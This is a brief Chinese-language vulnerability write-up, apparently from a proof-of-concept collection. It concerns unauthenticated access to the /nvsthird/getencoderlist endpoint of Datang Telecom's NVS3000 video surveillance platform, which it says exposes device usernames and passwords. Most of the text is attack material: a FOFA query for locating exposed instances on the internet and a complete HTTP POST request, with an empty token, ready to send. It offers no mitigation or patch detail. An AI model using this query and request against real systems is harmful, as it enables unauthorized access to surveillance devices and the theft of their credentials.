## 大唐电信NVS3000综合视频监控平台getencoderlist存在未授权访问漏洞

  大唐电信科技股份有限公司NVS3000综合视频监控平台 /nvsthird/getencoderlist 存在未授权访问，可获取设备账号密码。

## fofa

```
(body="NVS3000综合视频监控平台" && title=="综合视频监控平台") || app="大唐电信-NVS3000"
```

## poc

```
POST /nvsthird/getencoderlist HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Content-Length: 49

{"token":"","fromindex":0,"toindex":-1}
```

![image-20240707201853106](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407072018170.png)